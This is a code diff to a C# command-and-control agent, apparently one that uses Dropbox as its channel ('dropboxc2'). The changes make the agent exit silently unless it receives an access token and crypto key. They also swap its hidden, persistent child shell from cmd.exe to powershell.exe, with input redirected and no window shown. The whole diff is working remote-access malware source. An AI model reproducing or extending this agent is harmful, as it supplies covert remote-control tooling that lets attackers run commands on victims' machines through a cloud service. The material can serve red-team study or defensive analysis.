@@ -55,7 +55,24 @@ namespace dropboxc2
         // Main program function
         //==================================================================================================
         public static void Main(string[] args)
-        {
+        {   
+            string accessToken = String.Empty;
+            byte[] cryptoKey;
+
+            //---------------------------------------------------------------------
+            // Check arguments have been passed
+            if (args.Length == 2)
+            {
+                // Retrieve AccessToken and CryptoKey from passed arguments
+                accessToken = args[0];
+                cryptoKey = Convert.FromBase64String(args[1]);    
+            }
+            else
+            {
+                return;
+            }
+            
+
             //---------------------------------------------------------------------
             // Create an instance of the C2_Agent
             C2_Agent c2_agent = new C2_Agent();
@@ -77,11 +94,7 @@ namespace dropboxc2
 #if (DEBUG)
             Console.WriteLine("------------ AGENT STARTING ------------");
 #endif
-            
-            // Retrieve AccessToken and CryptoKey from passed arguments
-            string accessToken = args[0];
-            byte[] cryptoKey = Convert.FromBase64String(args[1]);
-                   
+                     
             // Break flag used to exit the agent
             bool breakFlag = false;
 
@@ -551,7 +564,7 @@ namespace dropboxc2
         }
 
         ///==================================================================================================
-        // This method runs a command in a spawned child process (cmd.exe). The child process is
+        // This method runs a command in a spawned child process (powershell.exe). The child process is
         // kept alive until it is explicitely exited. This allows for contextual commands and persistent
         // environment between commands.
         //==================================================================================================
@@ -580,8 +593,8 @@ namespace dropboxc2
                     procStartInfo.RedirectStandardInput = true;
                     procStartInfo.RedirectStandardOutput = true;
                     procStartInfo.RedirectStandardError = true;
-                    procStartInfo.FileName = "cmd.exe";
-                    //procStartInfo.Arguments = "/c powershell.exe"; // StdInput redirection of Powershell.exe doesn't work on Windows 7
+                    procStartInfo.FileName = "powershell.exe";
+                    procStartInfo.Arguments = "\"-\"";
                     procStartInfo.CreateNoWindow = true;
                     procStartInfo.ErrorDialog = false;
 
